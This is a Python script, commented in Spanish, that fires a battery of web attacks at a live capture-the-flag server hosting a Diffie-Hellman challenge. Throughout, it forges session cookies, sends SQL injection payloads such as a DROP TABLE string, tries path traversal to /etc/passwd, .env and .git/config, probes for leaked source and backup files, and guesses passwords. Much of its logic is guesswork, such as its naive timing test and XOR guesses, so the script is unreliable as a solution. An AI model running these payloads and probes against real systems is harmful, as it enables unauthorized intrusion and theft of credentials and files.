#!/usr/bin/env python3

import requests
import re
import time
import base64
import hashlib
from itertools import product

print("🔥" * 30)
print("ATAQUE DEFINITIVO - NO HAY VUELTA ATRÁS")
print("🔥" * 30)

base = "https://diffie-hellman.crypto.w3challs.com/"
p = 1091136745528189467933281517836874347556227973368844785834730809158502707734111726197047853034779577326799376909360702796771580766448794604223666095534254989157674044885025529655475251174022547573400542404497196315179009518790845093
g = 788566880005302277341720913014765764523749662717255764973422789169351342670625046069737389605574848412134408890505831396888152508510392260349529979008920978675421422171288130340362523984410268300658262790954147173882579740249230159

def brute_force_session():
    """Generar y probar múltiples sesiones"""
    print("\n[BRUTE FORCE] Generando sesiones...")
    
    for i in range(10):
        s = requests.Session()
        
        # Generar diferentes cookies
        fake_session = hashlib.md5(str(i).encode()).hexdigest()
        s.cookies.set('PHPSESSID', fake_session)
        
        resp = s.get(base + "dhkey.php")
        if "alice_send_key" in resp.text:
            print(f"[!] Sesión válida encontrada: {fake_session}")
            return s
    
    # Si no funciona, obtener una real
    s = requests.Session()
    s.get(base + "challenge_diffie_hellman.php")
    return s

def exploit_debug_mode():
    """Explotar modos debug encontrados"""
    print("\n[DEBUG MODE] Explotando endpoints debug...")
    
    s = requests.Session()
    s.get(base + "challenge_diffie_hellman.php")
    
    # Probar parámetros debug
    debug_params = [
        {'debug': '1', 'type': 'alice_send_key', 'alice_send_key': 'A = 1"'},
        {'test': '1', 'skip_validation': '1'},
        {'bypass': '1', 'secret': '1'},
        {'admin': '1', 'force': '1'},
        {'dev': '1', 'override': '1'}
    ]
    
    for params in debug_params:
        resp = s.get(base + "dhkey.php", params=params)
        if "Encrypted code" in resp.text:
            match = re.search(r'Encrypted code\s*:\s*(\d+)', resp.text)
            if match:
                enc = int(match.group(1))
                print(f"[!] Código encontrado con params {params}: {enc}")
                
                # Descifrar con varios secretos
                for secret in range(10):
                    dec = enc ^ secret
                    resp = s.get(f"{base}solution_diffie_hellman.php?password={dec}")
                    if "flag" in resp.text.lower() or "congratulations" in resp.text.lower():
                        print(f"[!] FLAG ENCONTRADA con secreto {secret}!")
                        print(resp.text)
                        return True
    
    return False

def sql_injection():
    """Intentar SQL injection en los parámetros"""
    print("\n[SQL INJECTION] Probando inyecciones...")
    
    s = requests.Session()
    s.get(base + "challenge_diffie_hellman.php")
    
    payloads = [
        "1' OR '1'='1",
        "1\" OR \"1\"=\"1",
        "1; DROP TABLE users--",
        "' UNION SELECT 1,2,3--",
        "admin'--",
        "1' AND 1=1--"
    ]
    
    for payload in payloads:
        alice_msg = f'A = {payload}"'
        data = {'alice_send_key': alice_msg}
        resp = s.post(base + "dhkey.php?type=alice_send_key", data=data)
        
        if "error" in resp.text.lower() or "mysql" in resp.text.lower():
            print(f"[!] Posible SQL injection con: {payload}")

def path_traversal():
    """Intentar path traversal para leer archivos"""
    print("\n[PATH TRAVERSAL] Buscando archivos...")
    
    s = requests.Session()
    s.get(base + "challenge_diffie_hellman.php")
    
    files = [
        '../solution.txt',
        '../../flag.txt',
        '../../../etc/passwd',
        'solution_diffie_hellman.php.bak',
        '.git/config',
        '.env',
        'config.php',
        'dhkey.php.swp'
    ]
    
    for file in files:
        resp = s.get(base + file)
        if resp.status_code == 200 and len(resp.text) > 0:
            print(f"[!] Archivo encontrado: {file}")
            if "flag" in resp.text.lower():
                print(f"[!] FLAG EN ARCHIVO: {resp.text[:200]}")

def timing_attack():
    """Ataque de timing para descubrir el secreto"""
    print("\n[TIMING ATTACK] Analizando tiempos...")
    
    s = requests.Session()
    s.get(base + "challenge_diffie_hellman.php")
    
    # Probar diferentes passwords y medir tiempo
    for password in range(1000000, 1000100):
        start = time.time()
        resp = s.get(f"{base}solution_diffie_hellman.php?password={password}")
        elapsed = time.time() - start
        
        if elapsed > 0.5:  # Si tarda más, puede ser correcto
            print(f"[!] Password {password} tardó {elapsed:.2f}s")
            if "flag" in resp.text.lower():
                print(f"[!] FLAG ENCONTRADA: {resp.text}")
                return True
    
    return False

def cookie_manipulation():
    """Manipular cookies para bypass"""
    print("\n[COOKIE MANIPULATION] Manipulando cookies...")
    
    s = requests.Session()
    
    # Intentar cookies especiales
    special_cookies = [
        {'PHPSESSID': 'admin'},
        {'PHPSESSID': 'debug'},
        {'admin': '1', 'PHPSESSID': 'test'},
        {'role': 'admin', 'PHPSESSID': 'hack'},
        {'bypass': 'true', 'PHPSESSID': 'pwn'}
    ]
    
    for cookies in special_cookies:
        s.cookies.clear()
        for k, v in cookies.items():
            s.cookies.set(k, v)
        
        resp = s.get(base + "dhkey.php")
        if "Encrypted" in resp.text:
            print(f"[!] Cookies {cookies} dieron resultado!")

def parse_javascript():
    """Analizar JavaScript en busca de secretos"""
    print("\n[JS ANALYSIS] Analizando JavaScript...")
    
    s = requests.Session()
    resp = s.get(base + "challenge_diffie_hellman.php")
    
    # Buscar variables JavaScript
    js_vars = re.findall(r'var\s+(\w+)\s*=\s*([^;]+);', resp.text)
    for var_name, var_value in js_vars:
        print(f"[*] Variable JS: {var_name} = {var_value[:50]}")
        
        # Si es un número, probarlo como password
        if var_value.isdigit():
            resp = s.get(f"{base}solution_diffie_hellman.php?password={var_value}")
            if "flag" in resp.text.lower():
                print(f"[!] FLAG con {var_value}!")

def source_code_disclosure():
    """Intentar obtener código fuente"""
    print("\n[SOURCE DISCLOSURE] Buscando código fuente...")
    
    s = requests.Session()
    
    # Intentar obtener PHP source
    source_urls = [
        'dhkey.phps',
        'dhkey.php.txt',
        'dhkey.php~',
        'dhkey.php.old',
        'solution_diffie_hellman.phps',
        'solution_diffie_hellman.php.txt'
    ]
    
    for url in source_urls:
        resp = s.get(base + url)
        if resp.status_code == 200 and "<?php" in resp.text:
            print(f"[!] Código fuente encontrado en {url}!")
            print(resp.text[:500])

def final_attempt():
    """Último intento desesperado"""
    print("\n[FINAL] Último intento...")
    
    # Intentar con el ejemplo del challenge
    s = requests.Session()
    
    # Obtener una sesión válida
    resp = s.get(base + "challenge_diffie_hellman.php")
    
    # Intentar acceder directamente a la solución con passwords comunes
    common_passwords = [
        '0', '1', '2', '123', '1234', '12345', '123456',
        '1337', '31337', 'admin', 'password', 'flag',
        str(g % 1000000),  # g mod 1000000
        str(p % 1000000),  # p mod 1000000
        str((g * p) % 1000000),  # g*p mod 1000000
        '42', '666', '1001', '9999'
    ]
    
    for pwd in common_passwords:
        resp = s.get(f"{base}solution_diffie_hellman.php?password={pwd}")
        if "wrong" not in resp.text.lower() and len(resp.text) > 50:
            print(f"[!] Respuesta con password {pwd}:")
            print(resp.text[:300])
            
            if "flag" in resp.text.lower() or "W3C" in resp.text:
                print(f"\n🔥🔥🔥 FLAG ENCONTRADA 🔥🔥🔥")
                return True
    
    return False

# EJECUTAR TODOS LOS ATAQUES
print("\n[*] INICIANDO BATERÍA COMPLETA DE ATAQUES...")

attacks = [
    exploit_debug_mode,
    sql_injection,
    path_traversal,
    timing_attack,
    cookie_manipulation,
    parse_javascript,
    source_code_disclosure,
    final_attempt
]

for attack in attacks:
    try:
        if attack():
            print("\n[!] ATAQUE EXITOSO!")
            break
    except Exception as e:
        print(f"[x] Error en {attack.__name__}: {e}")
        continue

print("\n" + "="*60)
print("Si ningún ataque funcionó, el servidor está bien protegido.")
print("Necesitas ejecutarlo manualmente en un navegador real.")
print("="*60)